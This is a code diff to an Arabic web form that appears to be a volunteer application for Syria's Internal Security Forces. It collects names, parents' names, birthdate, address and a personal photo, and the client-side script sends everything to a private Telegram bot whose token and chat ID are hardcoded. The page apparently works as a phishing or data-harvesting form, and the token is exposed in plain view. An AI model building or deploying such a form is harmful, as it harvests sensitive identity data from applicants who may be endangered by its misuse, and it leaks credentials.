@@ -73,6 +73,11 @@
         .required {
             color: #d9534f;
         }
+        #status {
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -150,6 +155,7 @@
             </div>
             
             <button type="submit">إرسال الطلب</button>
+            <div id="status"></div>
         </form>
     </div>
 
@@ -159,12 +165,21 @@
             
             const formData = new FormData(this);
             const photoInput = document.getElementById('photo');
+            const statusDiv = document.getElementById('status');
             
             // تحقق من أن الملف المرفوع هو صورة
             if (photoInput.files.length > 0) {
                 const file = photoInput.files[0];
                 if (!file.type.match('image.*')) {
-                    alert('الرجاء إرفاق صورة صالحة');
+                    statusDiv.textContent = 'الرجاء إرفاق صورة صالحة';
+                    statusDiv.style.color = 'red';
+                    return;
+                }
+                
+                // تحقق من حجم الصورة (أقل من 5MB)
+                if (file.size > 5 * 1024 * 1024) {
+                    statusDiv.textContent = 'حجم الصورة يجب أن يكون أقل من 5MB';
+                    statusDiv.style.color = 'red';
                     return;
                 }
             }
@@ -173,68 +188,49 @@
             const button = document.querySelector('button');
             button.disabled = true;
             button.textContent = 'جاري إرسال البيانات...';
+            statusDiv.textContent = '';
             
             try {
-                // تحويل الصورة إلى base64
-                let photoBase64 = '';
-                if (photoInput.files.length > 0) {
-                    photoBase64 = await toBase64(photoInput.files[0]);
-                }
+                // تجميع البيانات النصية
+                const textData = `
+                    📌 طلب جديد للتطوع في قوى الأمن الداخلي:
+                    
+                    الاسم: ${formData.get('name')}
+                    الكنية: ${formData.get('surname')}
+                    اسم الأب: ${formData.get('father')}
+                    اسم الأم: ${formData.get('mother')}
+                    تاريخ الميلاد: ${formData.get('birthdate')}
+                    السكن الحالي: ${formData.get('address')}
+                    مقيم في سوريا: ${formData.get('resident')}
+                    المحافظة المطلوبة: ${formData.get('province')}
+                `;
                 
-                // تجميع البيانات
-                const data = {
-                    name: formData.get('name'),
-                    surname: formData.get('surname'),
-                    father: formData.get('father'),
-                    mother: formData.get('mother'),
-                    birthdate: formData.get('birthdate'),
-                    address: formData.get('address'),
-                    resident: formData.get('resident'),
-                    province: formData.get('province'),
-                    photo: photoBase64
-                };
+                // إرسال البيانات النصية إلى Telegram
+                const textResponse = await sendTextToTelegram(textData);
                 
-                // إرسال البيانات إلى Telegram
-                const telegramResponse = await sendToTelegram(data);
-                
-                if (telegramResponse.ok) {
-                    alert('تم إرسال طلب التطوع بنجاح! شكراً لتقديمك.');
+                if (textResponse.ok) {
+                    // إذا كانت هناك صورة، أرسلها كملف منفصل
+                    if (photoInput.files.length > 0) {
+                        await sendPhotoToTelegram(photoInput.files[0], formData.get('name'));
+                    }
+                    
+                    statusDiv.textContent = 'تم إرسال طلب التطوع بنجاح! شكراً لتقديمك.';
+                    statusDiv.style.color = 'green';
                     this.reset();
                 } else {
-                    throw new Error('فشل إرسال البيانات');
+                    throw new Error(textResponse.description || 'فشل إرسال البيانات');
                 }
             } catch (error) {
-                console.error(error);
-                alert('حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.');
+                console.error('Error:', error);
+                statusDiv.textContent = 'حدث خطأ أثناء إرسال البيانات. الرجاء المحاولة مرة أخرى.';
+                statusDiv.style.color = 'red';
             } finally {
                 button.disabled = false;
                 button.textContent = 'إرسال الطلب';
             }
         });
         
-        function toBase64(file) {
-            return new Promise((resolve, reject) => {
-                const reader = new FileReader();
-                reader.readAsDataURL(file);
-                reader.onload = () => resolve(reader.result.split(',')[1]);
-                reader.onerror = error => reject(error);
-            });
-        }
-        
-        async function sendToTelegram(data) {
-            const text = `
-                📌 طلب جديد للتطوع في قوى الأمن الداخلي:
-                
-                الاسم: ${data.name}
-                الكنية: ${data.surname}
-                اسم الأب: ${data.father}
-                اسم الأم: ${data.mother}
-                تاريخ الميلاد: ${data.birthdate}
-                السكن الحالي: ${data.address}
-                مقيم في سوريا: ${data.resident}
-                المحافظة المطلوبة: ${data.province}
-            `;
-            
+        async function sendTextToTelegram(text) {
             const telegramUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`;
             
             const response = await fetch(telegramUrl, {
@@ -249,23 +245,23 @@
                 })
             });
             
-            // إذا كانت هناك صورة، أرسلها كملف منفصل
-            if (data.photo) {
-                const photoUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`;
-                await fetch(photoUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: '7493001551',
-                        photo: `data:image/jpeg;base64,${data.photo}`,
-                        caption: 'الصورة الشخصية للمتطوع'
-                    })
-                });
-            }
+            return await response.json();
+        }
+        
+        async function sendPhotoToTelegram(photoFile, name) {
+            const formData = new FormData();
+            formData.append('chat_id', '7493001551');
+            formData.append('photo', photoFile);
+            formData.append('caption', `الصورة الشخصية للمتطوع: ${name}`);
             
-            return response.json();
+            const photoUrl = `https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendPhoto`;
+            
+            const response = await fetch(photoUrl, {
+                method: 'POST',
+                body: formData
+            });
+            
+            return await response.json();
         }
     </script>
 </body>
